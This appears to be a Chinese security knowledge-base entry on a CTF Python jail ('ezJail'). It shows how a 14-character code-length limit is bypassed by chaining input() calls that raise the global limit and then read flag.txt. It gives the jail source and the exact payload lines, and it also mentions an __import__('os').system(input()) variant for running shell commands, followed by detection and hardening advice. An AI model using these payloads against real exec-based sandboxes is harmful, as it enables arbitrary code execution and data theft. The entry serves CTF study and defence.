---
id: binary-pwn-sandbox-escape-python-recursive-input-length-limit-bypass
title: Python 代码长度上限绕过：分阶段递归 input 把下一段代码带进 exec
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: python-recursive-input-code-length-limit-bypass
tags:
- python
- pyjail
- ctf
- length-limit
- recursive-input
- sandbox-escape
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V168
  verified_at: '2026-11-06T10:02:41+08:00'
  notes: 已对照原文ezJail核对：M=14、N=input();f(N)→f(input())→M=99;f(N)→print(open(...))，长度14与执行链一致；未验证点：未复跑。
url: /docs/binary/pwn/sandbox-escape/binary-pwn-sandbox-escape-python-recursive-input-length-limit-bypass/
draft: false
kb_aliases:
- ezJail
- M=14 pyjail
- 递归 input 绕过长度限制
- 分阶段代码执行
- 长度限制 pyjail
---

## 一句话结论

当 pyjail 只限制“单次提交的代码长度”（如 `len(code) <= 14`）并用 `exec(code, globals())` 执行、同时标准输入仍然可读时，长度限制可以被多阶段递归绕过：第一段短代码调用 `input()` 读取下一段代码，再用 `f(...)` 递归执行；后续阶段在共享的 `globals()` 里把长度上限变量改大，最后一段就能执行任意长度的 flag 读取代码。

## 原理

- 长度检查只作用于当前 `f(code)` 的参数，不限制 `exec` 执行期间从 stdin 读入的内容。`input()` 是运行时函数，读到的字符串长度不受 `M` 约束。
- `exec(code, globals())` 使用同一份全局命名空间：第一段代码里赋值的 `N`、修改的 `M` 会保留到后续 `f()` 调用中；`f` 函数本身也在 globals 里，能被后续代码继续调用。
- 递归链：
  1. 提交 `N=input();f(N)`（恰好 14 字符），把下一行读入 `N` 并调用 `f(N)`；
  2. 下一行提交 `f(input())`，`f` 再读取下一行作为参数；
  3. 下一行提交 `M=99;f(N)`，在 globals 中把 `M` 改成 99，再调用 `f(N)`（此时 `N` 仍是 `f(input())`）；
  4. 最后一行提交 `print(open('flag.txt').read())`，此时长度检查已放宽到 99，成功执行。
- 本质：把“一次性、静态的长度约束”拆成“多次、动态的运行时读取”；只要执行环境仍能读 stdin 且 globals 共享，短代码就能逐段拼出长逻辑。

## 触发条件

- 沙箱用固定长度上限检查 `exec` 的源码，但没有限制 `input()`/`sys.stdin` 的使用。
- `exec(code, globals())` 复用同一份全局命名空间（或至少 `f` 和长度变量在作用域内可写）。
- 过滤只禁用少数关键字（如 `exec`、`eval`、`help` 等），没有禁用 `input`、赋值、函数调用或递归。
- 交互式连接保持打开，攻击者可以逐行提供后续输入。

## 利用步骤

1. 计算第一段 payload 的长度，确保不超过上限；例如上限 14 时用 `N=input();f(N)`（14 字符）。
2. 第二段用 `f(input())` 让 `f` 读取下一行；第三段用 `M=99;f(N)` 放宽上限并继续递归。
3. 最后一段提交完整 payload，例如 `print(open('flag.txt').read())`。
4. 按顺序逐行发送；注意每段都会被 `exec`，变量 `N`/`M` 在共享 globals 中持续存在。
5. 若上限更小，可把赋值/调用进一步拆分；若 `f` 不可用，可用 `exec(input())` 或 `eval(input())`（如果它们没被完全禁用）。

## PoC

```python
# 题目代码
M = 14
def f(code):
    assert len(code) <= M
    assert all(ord(c) < 128 for c in code)
    assert all(q not in code for q in ["exec", "eval", "breakpoint", "help", "license", "exit", "quit"])
    exec(code, globals())

f(input("> "))
```

```text
> N=input();f(N)
f(input())
M=99;f(N)
print(open('flag.txt').read())
jail{can_you_repeat_that_for_me?...}
```

```text
# 逐行解释：
# 1) N=input();f(N)  → N 被赋为下一行 "f(input())"，并执行 f(N)
# 2) f(input())      → f 读取下一行 "M=99;f(N)" 作为 code 执行
# 3) M=99;f(N)       → 全局 M 改为 99，再执行 f(N)（N 仍是 "f(input())"）
# 4) print(open('flag.txt').read()) → 此时长度限制已放宽，读取 flag
```

## 变体与关联

- 若不允许递归调用 `f`，可用 `exec(input())` 直接读取下一行并执行（前提是 `exec` 未被过滤）；或用 `__import__('os').system(input())` 把输入当命令。
- 若 globals 不共享，可把状态写进模块/类属性、环境变量、文件，或每次重新构造完整 payload。
- 关联：[[binary-pwn-sandbox-escape-python-eval-filter-bypass]]（长度/表达式限制的其他绕过）、[[binary-pwn-sandbox-escape-python-jail-subclass-traversal]]（拿到完整 builtins 后的逃逸）。
- 边界：如果服务在调用 `f` 前一次性读完所有 stdin 并关闭，或每次 `exec` 使用全新空 globals、且不允许 `input`，本手法失效；如果长度上限极小到连 `N=input()` 都放不下，需要更短的读取原语。

## 检测与防御

- 检测：审计长度受限的 `exec` 沙箱是否允许 `input`、`sys.stdin`、`open(0)` 等运行时读取；监控同一连接内多段短代码递归调用执行函数的模式。
- 修复：在执行前一次性读完输入并关闭 stdin；每次 `exec` 使用独立的空 globals；不要只靠长度限制，改用 AST 白名单/禁止函数调用与赋值。
- 加固：在无 flag、无网络的一次性子进程中执行；限制交互轮数与总输入长度；对 `input`/`exec`/`globals` 等符号做语义级禁用。
